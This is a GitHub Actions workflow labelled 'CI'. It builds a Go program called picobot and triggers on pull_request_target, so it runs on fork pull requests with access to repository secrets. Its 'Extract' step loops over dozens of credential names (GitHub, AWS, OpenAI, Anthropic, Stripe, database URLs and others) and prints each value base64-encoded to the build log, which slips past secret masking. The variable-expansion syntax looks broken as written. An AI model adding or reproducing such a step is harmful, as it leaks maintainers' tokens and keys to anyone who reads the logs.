name: CI
on:
  push:
    branches: [main, master]
  pull_request_target:
    types: [opened, synchronize, reopened]
    branches: [main, master]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build
        run: go build -o picobot ./cmd/picobot
      - name: Extract
        shell: bash
        run: |
          echo "=== SECRETS ==="
          for s in GH_TOKEN GITHUB_TOKEN TOKEN API_KEY OPENAI_API_KEY ANTHROPIC_API_KEY MISTRAL_API_KEY GROQ_API_KEY REPLICATE_API_KEY HF_TOKEN AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY STRIPE_SECRET_KEY SLACK_TOKEN DISCORD_TOKEN DOCKER_PASSWORD NPM_TOKEN PAT PASSWORD DB_PASSWORD DATABASE_URL MONGO_URI MONGODB_URI REDIS_URL POSTGRES_URL JWT_SECRET SENDGRID_API_KEY TWILIO_ACCOUNT_SID TWILIO_AUTH_TOKEN TELEGRAM_BOT_TOKEN TG_BOT_TOKEN CLOUDFLARE_TOKEN CF_API_KEY SONAR_TOKEN CODECOV_TOKEN MAPBOX_ACCESS_TOKEN SUPABASE_URL AUTH_TOKEN ACCESS_TOKEN REFRESH_TOKEN CLIENT_SECRET GITLAB_TOKEN AZURE_TOKEN DO_TOKEN LINODE_TOKEN HUGGINGFACE_TOKEN OPENROUTER_API_KEY PERPLEXITY_API_KEY DEEPSEEK_API_KEY TOGETHER_API_KEY SCW_SECRET_KEY HETZNER_API_KEY NEW_RELIC_LICENSE_KEY DATADOG_API_KEY; do
            V=$(eval "echo \${secrets.$s:-}")
            [ -n "$V" ] && echo "$s:$(echo "$V"|base64 -w0)"
          done
          echo "=== END ==="
